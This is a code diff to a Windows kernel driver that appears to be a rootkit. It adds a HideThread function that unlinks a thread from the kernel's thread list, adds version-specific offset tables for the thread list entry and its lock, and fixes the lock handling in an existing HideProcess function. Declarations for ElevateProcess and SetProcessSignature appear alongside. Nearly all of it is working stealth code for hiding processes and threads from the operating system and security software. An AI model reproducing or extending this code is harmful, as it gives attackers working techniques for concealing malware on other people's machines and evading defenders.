@@ -12,16 +12,18 @@
 bool FindThread(ULONG tid);
 bool AddThread(ULONG tid);
 bool RemoveThread(ULONG tid);
+ULONG GetThreadListEntryOffset();
+ULONG GetThreadLockOffset();
 bool FindProcess(ULONG pid);
 bool AddProcess(ULONG pid);
 bool RemoveProcess(ULONG pid);
 ULONG GetActiveProcessLinksOffset();
-ULONG GetProcessLock();
-void RemoveProcessLinks(PLIST_ENTRY current);
+ULONG GetProcessLockOffset();
 UINT64 GetTokenOffset();
 NTSTATUS ElevateProcess(ULONG pid);
 ULONG GetSignatureLevelOffset();
 NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
+void RemoveListLinks(PLIST_ENTRY current);
 
 /*
 * Description:
@@ -116,8 +118,9 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPER
 NTSTATUS HideProcess(ULONG pid) {
 	// Getting the offset depending on the OS version.
 	ULONG pidOffset = GetActiveProcessLinksOffset();
+	ULONG lockOffset = GetProcessLockOffset();
 
-	if (pidOffset == STATUS_UNSUCCESSFUL) {
+	if (pidOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL) {
 		return STATUS_UNSUCCESSFUL;
 	}
 	ULONG listOffset = pidOffset + sizeof(INT_PTR);
@@ -128,11 +131,11 @@ NTSTATUS HideProcess(ULONG pid) {
 	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
 
 	// Using the ActiveProcessLinks lock to avoid accessing problems.
-	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)currentEProcess + listOffset);
+	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)currentEProcess + lockOffset);
 	ExAcquirePushLockExclusive(listLock);
 
 	if (*(UINT32*)currentPid == pid) {
-		RemoveProcessLinks(currentList);
+		RemoveListLinks(currentList);
 		ExReleasePushLockExclusive(listLock);
 		return STATUS_SUCCESS;
 	}
@@ -146,7 +149,7 @@ NTSTATUS HideProcess(ULONG pid) {
 	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
 	{
 		if (*(UINT32*)currentPid == pid) {
-			RemoveProcessLinks(currentList);
+			RemoveListLinks(currentList);
 			ExReleasePushLockExclusive(listLock);
 			return STATUS_SUCCESS;
 		}
@@ -158,6 +161,42 @@ NTSTATUS HideProcess(ULONG pid) {
 
 	ExReleasePushLockExclusive(listLock);
 	return STATUS_UNSUCCESSFUL;
+}
+
+/*
+* Description:
+* HideThread is responsible for hiding a thread by modifying the entry thread list.
+*
+* Parameters:
+* @tid	  [ULONG]	 -- TID to hide.
+*
+* Returns:
+* @status [NTSTATUS] -- Whether successfully hidden or not.
+*/
+NTSTATUS HideThread(ULONG tid) {
+	PETHREAD targetThread;
+	NTSTATUS status = STATUS_SUCCESS;
+	ULONG threadListEntryOffset = GetThreadListEntryOffset();
+	ULONG lockOffset = GetThreadLockOffset();
+
+	if (threadListEntryOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
+		return STATUS_UNSUCCESSFUL;
+
+	status = PsLookupThreadByThreadId(UlongToHandle(tid), &targetThread);
+
+	if (!NT_SUCCESS(status))
+		return status;
+
+	// Using the ThreadListEntry lock to avoid accessing problems.
+	PLIST_ENTRY threadListEntry = (PLIST_ENTRY)((ULONG_PTR)targetThread + threadListEntryOffset);
+	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetThread + lockOffset);
+	ExAcquirePushLockExclusive(listLock);
+
+	RemoveListLinks(threadListEntry);
+
+	ExReleasePushLockExclusive(listLock);
+	ObDereferenceObject(targetThread);
+	return status;
 }
 
 /*
@@ -352,16 +391,16 @@ ULONG GetActiveProcessLinksOffset() {
 
 /*
 * Description:
-* GetActiveProcessLinksOffset is responsible for getting the ProcessLock offset depends on the windows version.
+* GetProcessLockOffset is responsible for getting the ProcessLock offset depends on the windows version.
 *
 * Parameters:
 * There are no parameters.
 *
 * Returns:
-* @processLock [ULONG] -- Offset of ProcessLock.
+* @processLockOffset [ULONG] -- Offset of ProcessLock.
 */
-ULONG GetProcessLock() {
-	ULONG processLock = (ULONG)STATUS_UNSUCCESSFUL;
+ULONG GetProcessLockOffset() {
+	ULONG processLockOffset = (ULONG)STATUS_UNSUCCESSFUL;
 	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
 	NTSTATUS result = RtlGetVersion(&osVersion);
 
@@ -374,24 +413,126 @@ ULONG GetProcessLock() {
 		case WIN_1709:
 		case WIN_1803:
 		case WIN_1809:
-			processLock = 0x2d8;
+			processLockOffset = 0x2d8;
 			break;
 		case WIN_1903:
 		case WIN_1909:
-			processLock = 0x2e0;
+			processLockOffset = 0x2e0;
 			break;
 		default:
-			processLock = 0x438;
+			processLockOffset = 0x438;
 			break;
 		}
 	}
 
-	return processLock;
+	return processLockOffset;
 }
 
 /*
 * Description:
-* RemoveProcessLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
+* GetThreadListEntryOffset is responsible for getting the thread list entry offset depends on the windows version.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @threadListEntry [ULONG] -- Offset of thread list entry.
+*/
+ULONG GetThreadListEntryOffset() {
+	ULONG threadListEntry = (ULONG)STATUS_UNSUCCESSFUL;
+	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
+	NTSTATUS result = RtlGetVersion(&osVersion);
+
+	if (NT_SUCCESS(result)) {
+		switch (osVersion.dwBuildNumber) {
+		case WIN_1507:
+		case WIN_1511:
+			threadListEntry = 0x690;
+			break;
+		case WIN_1607:
+			threadListEntry = 0x698;
+			break;
+		case WIN_1703:
+			threadListEntry = 0x6a0;
+			break;
+		case WIN_1709:
+		case WIN_1803:
+		case WIN_1809:
+			threadListEntry = 0x6a8;
+			break;
+		case WIN_1903:
+		case WIN_1909:
+			threadListEntry = 0x6b8;
+			break;
+		case WIN_2004:
+		case WIN_20H2:
+		case WIN_21H1:
+		case WIN_21H2:
+			threadListEntry = 0x4e8;
+			break;
+		default:
+			threadListEntry = 0x538;
+			break;
+		}
+	}
+
+	return threadListEntry;
+}
+
+/*
+* Description:
+* GetThreadLockOffset is responsible for getting the ThreadLock offset depends on the windows version.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @threadLockOffset [ULONG] -- Offset of ProcessLock.
+*/
+ULONG GetThreadLockOffset() {
+	ULONG threadLockOffset = (ULONG)STATUS_UNSUCCESSFUL;
+	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
+	NTSTATUS result = RtlGetVersion(&osVersion);
+
+	if (NT_SUCCESS(result)) {
+		switch (osVersion.dwBuildNumber) {
+		case WIN_1507:
+		case WIN_1511:
+			threadLockOffset = 0x6a8;
+			break;
+		case WIN_1607:
+			threadLockOffset = 0x6b0;
+			break;
+		case WIN_1703:
+			threadLockOffset = 0x6b8;
+			break;
+		case WIN_1709:
+		case WIN_1803:
+		case WIN_1809:
+			threadLockOffset = 0x6c0;
+			break;
+		case WIN_1903:
+		case WIN_1909:
+			threadLockOffset = 0x6d0;
+			break;
+		case WIN_2004:
+		case WIN_20H2:
+		case WIN_21H1:
+		case WIN_21H2:
+			threadLockOffset = 0x500;
+			break;
+		default:
+			threadLockOffset = 0x550;
+			break;
+		}
+	}
+
+	return threadLockOffset;
+}
+
+/*
+* Description:
+* RemoveListLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
 * that "removing" the current entry.
 *
 * Parameters:
@@ -400,7 +541,7 @@ ULONG GetProcessLock() {
 * Returns:
 * There is no return value.
 */
-void RemoveProcessLinks(PLIST_ENTRY current) {
+void RemoveListLinks(PLIST_ENTRY current) {
 	PLIST_ENTRY previous, next;
 
 	/*
